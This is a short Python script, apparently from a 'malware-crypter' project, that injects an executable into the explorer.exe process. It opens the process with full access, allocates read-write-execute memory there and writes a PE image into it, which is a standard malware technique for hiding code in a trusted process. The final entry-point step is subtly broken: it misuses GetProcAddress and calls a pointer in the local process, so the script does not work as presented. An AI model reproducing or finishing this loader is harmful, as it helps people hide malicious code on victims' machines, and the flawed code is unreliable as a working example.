import ctypes
import psutil
import pefile

# Get the handle to the process
process_name = 'explorer.exe'
process = next(filter(lambda proc: proc.name() == process_name, psutil.process_iter()))
process_handle = ctypes.windll.kernel32.OpenProcess(0x1F0FFF, False, process.pid)
if not process_handle:
    raise ctypes.WinError()

# Load the executable into memory
executable_path = r'C:\Users\John Emro\Documents\GitHub\malware-crypter\MW_onmemory\calculator.exe'
pe = pefile.PE(executable_path)
executable = pe.get_memory_mapped_image()
buffer_size = len(executable)
allocation_base = ctypes.windll.kernel32.VirtualAllocEx(process_handle, None, buffer_size, 0x3000, 0x40)
if not allocation_base:
    raise ctypes.WinError()

ctypes.windll.kernel32.WriteProcessMemory(process_handle, allocation_base, executable, buffer_size, None)

# Get a function pointer to the entry point of the executable
entry_point = ctypes.windll.kernel32.GetProcAddress(ctypes.windll.kernel32._handle, b'shell32.dll')
entry_point = ctypes.cast(entry_point, ctypes.CFUNCTYPE(None))

# Call the entry point
entry_point()
